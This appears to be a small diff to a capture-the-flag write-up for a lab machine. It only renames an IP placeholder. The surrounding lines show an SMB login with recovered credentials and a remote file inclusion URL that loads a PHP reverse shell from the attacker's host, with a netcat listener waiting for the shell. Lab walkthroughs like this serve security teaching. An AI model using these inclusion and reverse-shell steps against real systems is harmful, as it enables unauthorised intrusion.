@@ -259,7 +259,7 @@ Let's head back to ```smbclient``` and try and use the password to enter his sha
 <p>Now that we know the username and the password, we need to change the command a little bit so we can log into the share using a specified username.</p>
 
 ```bash
-smbclient \\\\[boxIP]\\milesdyson -U milesdyson
+smbclient \\\\[targetIP]\\milesdyson -U milesdyson
 ```
 *we added* ```-U milesdyson``` *to specify a username*<br>
 
@@ -378,7 +378,7 @@ python2 -m SimpleHTTPServer 80
 <p>When that is done, you can add out full URL including the reverse shell where [FI] is.</p>
 
 **Full URL:**<br>
-*http://[boxIP]/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<yourIP>/php-reverse-shell.php*<br>
+*http://[targetIP]/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<yourIP>/php-reverse-shell.php*<br>
 
 <p>Once that is done, head over to your netcat listener and let's see if we have a shell.</p>
 
